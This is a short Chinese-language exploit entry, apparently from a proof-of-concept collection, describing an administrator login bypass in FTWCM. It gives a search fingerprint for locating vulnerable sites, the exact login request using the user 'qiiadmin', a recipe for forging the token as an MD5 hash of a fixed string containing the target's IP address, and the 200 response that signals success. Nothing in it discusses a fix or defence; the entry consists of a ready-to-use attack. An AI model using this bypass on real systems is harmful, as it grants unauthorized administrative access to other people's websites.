# FTWCM存在管理员登录绕过

FTWCM ｜ 其他 ｜ —
- **指纹**：`title="ftwcm"`
- **请求**：`GET /Webgroup/Index/login.html?user=qiiadmin&stime=1&token=<计算出的token值> HTTP/1.1`

**Payload**
```
token计算: md5("1/qiiadmin/从URL中提取IP地址/logincheck/subdomain")
比如：md5("1/qiiadmin/101.xxx.xxx.111/logincheck/subdomain")
Host:
```
- **响应特征**：200